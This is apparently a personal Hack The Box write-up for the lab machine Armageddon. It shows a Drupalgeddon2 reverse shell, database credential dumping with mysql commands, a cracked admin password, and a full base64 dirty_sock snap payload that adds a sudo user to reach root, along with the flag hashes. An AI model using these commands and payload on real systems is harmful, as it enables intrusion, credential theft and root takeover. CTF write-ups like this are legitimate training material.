#  Armageddon
ip: 10.10.10.233

## nmap 
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-28 20:47 IST
Nmap scan report for 10.10.10.233
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|_  256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.69 seconds
```

## web-page
![[Screenshot 2021-03-28 at 8.47.47 PM.png]]


## possible exploits

https://github.com/dreadlocked/Drupalgeddon2

![[Screenshot 2021-03-28 at 9.18.09 PM.png]]

Here we got a rev shell as apache but cannot get a high privalage one 

metasploit
https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/

![[Screenshot 2021-03-28 at 9.39.20 PM.png]]

![[Screenshot 2021-03-28 at 9.40.31 PM.png]]

## enumeration

`cat /var/www/html/sites/default/settings.php`

![[Screenshot 2021-03-28 at 9.44.28 PM.png]]

```php
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

```bash

mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'

mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables;'

mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select * from users;'

mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select name, pass from users;'
```

![[Screenshot 2021-03-28 at 9.52.01 PM.png]]

brucetherealadmin : $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
React 1 : D2JnXt8FHj9aNq2Cph6Fvf6V145myHiaDVKKAAOI.wO1DnuvN31E
lolz  : DPMvM0/7MfcEAzTybrEVQ.VLa2d0LUxXfZ6Am7dECkrq6./wauaU


## hash cracking
![[Screenshot 2021-03-28 at 9.55.42 PM.png]]

## creds
brucetherealadmin: booboo

## ssh as brucetherealadmin
![[Screenshot 2021-03-29 at 10.26.45 PM.png]]

User hash == 017ec17852247f3028532fa2c416d0a5

## privilege escalation
`sudo -l`
![[Screenshot 2021-03-28 at 11.24.09 PM.png]]

https://initblog.com/2019/dirty-sock/

https://github.com/initstring/dirty_sock

when going through the code https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py#L45 we got the base64 encoded malicious snap package. 

We will use that snap package to get the new user.

Here we are creating a malicious snap file and then installing it with root privileges.


```bash
python -c print"'''aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''+ 'A' * 4256 + '=='" | base64 -d > exploit.snap
```

running you will get exploit.snap and transfer it to the victim

and run
`sudo /usr/bin/snap install --devmode exploit.snap`

now here a new user is created with creds `dirty_sock:dirty_sock`

switch user

run `sudo su`
 now you are root

![[Screenshot 2021-03-29 at 10.35.38 PM.png]]

![[Screenshot 2021-03-29 at 10.35.53 PM.png]]

![[Screenshot 2021-03-29 at 10.50.35 PM.png]]

![[Screenshot 2021-03-29 at 10.51.42 PM.png]]

root hash === bb21318aefdbb8cc546a842062a69aa2

----
Here in the above screenshot you might see a different ip. that is because I was using the new HTB  Weekly Release Arena. Cause before, as being the new recent machine, I was getting fake flags (changed by the users who rooted it) and already exploited machine...
but Weekly Release Arena gets you a new fresh machine for you, so it DOESN'T conflict with the other users.
